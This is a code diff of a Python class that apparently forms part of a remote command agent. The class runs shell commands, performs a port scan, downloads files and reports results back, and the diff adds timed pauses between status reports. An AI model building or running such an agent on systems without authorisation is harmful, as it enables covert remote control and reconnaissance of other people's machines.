@@ -90,7 +90,7 @@ class command():
 
     ## *************************** add here for new cmd_types! ****
     def set_subprocess_args(self):  
-        if self.type == 'download_file':
+        if self.type == 'download_text_file':
             self.args         = [sys.executable, self.exe_filepath] + self.args
         elif self.type == 'one_port_scan':
             hostname        = socket.gethostname()
@@ -106,17 +106,19 @@ class command():
         else:
             pass
     def send_data_or_file(self,data):
-        if self.type == 'download_file':
+        if self.type == 'download_text_file':
             data['filename'] = self.args[3]
         send_data(data)
     ## **************************************************************
 
     def run_subprocess(self):
         send_response(f"Running cmd {self.id} \n")
+        time.sleep(INTERVAL)
         p = subprocess.run(self.args, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         err         = p.stderr.decode()
         if err!="":
             send_response(f"Error cmd {self.id} \n")
+            time.sleep(INTERVAL)
         output      = p.stdout.decode().strip('\r\n')
         return {'output':output, 'err':err, 'id':self.id}
 
@@ -126,6 +128,7 @@ class command():
     
     def funcs_to_run(self):
         send_response(f"Initialized cmd {self.id} \n")
+        time.sleep(INTERVAL)
         self.set_subprocess_args()
         data = self.run_subprocess()
         self.send_data_or_file(data)
